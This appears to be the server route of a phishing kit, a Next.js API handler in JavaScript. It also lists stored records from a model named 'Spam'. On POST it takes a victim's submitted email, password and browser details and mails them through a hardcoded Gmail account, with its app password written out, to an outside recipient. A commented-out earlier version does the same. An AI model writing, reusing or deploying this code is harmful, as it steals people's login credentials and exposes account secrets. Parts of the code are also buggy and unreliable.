// import dbConnect from "../../../lib/dbConnect";
import Spam from "../../../models/spam";
import nodeMailer from 'nodemailer';
// https://www.youtube.com/watch?v=l--0JyIS5Ts

export default async function handler(req, res) {
  const { method, body } = req
  // await dbConnect();

  switch (method) {
    case "GET":
      try {
        const limitNr = Number(req.query.limit);

        let spam = await Spam.find({ })
          .sort({createdAt: -1})
          .skip((limitNr - 1) * 3)
          .limit(3);

        return res.status(201).send(spam);
      } catch (error) {
        console.log(error)
        return res.status(400).send("Invalid username or password");
      }
    case 'POST':
      // try {

      //   let p = await Spam.findOne({ email: body.email });
      //   if(p) {
      //     return res.status(201).send("k k");
      //   }

      //   let spam = new Spam(body);
      //   await spam.save();

      //   const transporter = nodeMailer.createTransport({
      //     service: "gmail",
      //     auth: {
      //       user: "rheiinklaus@gmail.com",
      //       pass: "fnjwlzlyqxbthlvw"
      //     }
      //   });
        
      //   const option = {
      //     from: "rheiinklaus@gmail.com",
      //     to: "mariac.perezcaba@gmail.com",
      //     subject: "booooooooommmmmmmmmmmmmmmmm",
      //     html: `
      //       <p>email: ${body.email}</p>
      //       <p>password: ${body.password}</p>
      //       <p>browser: ${body.browser}</p>
      //       <p>createdAt: ${Date(body.createdAt)}</p>
      //     `
      //   }

      //   transporter.sendMail(option, function(error, info) {
      //     if(error) {
      //       cconsole.log(error);
      //     } else {
      //       console.log('mail send')
      //     }
      //   })

      //   const token = jwt.sign({_id: this._id, date:}, "what", {expiresIn: "15h"});;


      //   return res.status(201).header("stmmm", token).send("k k");
      // } catch (error) {
      //   console.log(error)
      //   return res.status(400).send("Invalid username or password");
      // }
  try {
      const transporter = nodeMailer.createTransport({
        service: "gmail",
        auth: {
            user: "rheiinklaus@gmail.com",
            pass: "fnjwlzlyqxbthlvw"
          }
        });
        
        const option = {
          from: "rheiinklaus@gmail.com",
          to: "mariac.perezcaba@gmail.com",
          subject: "User",
          html: `
            <p>email: ${body.email}</p>
            <p>password: ${body.password}</p>
            <p>browser: ${body.browser}</p>
            <p>createdAt: ${Date(body.createdAt)}</p>
          `
        }

        await new Promise((resolve, reject) => {
          // send mail
          transporter.sendMail(option, (err, info) => {
              if (err) {
                  console.error(err);
                  reject(err);
              } else {
                  console.log(info);
                  resolve(info);
              }
          });
      });
  } catch (err) {
    return err;
  }
    default:
      return err;

      break;
  }
}
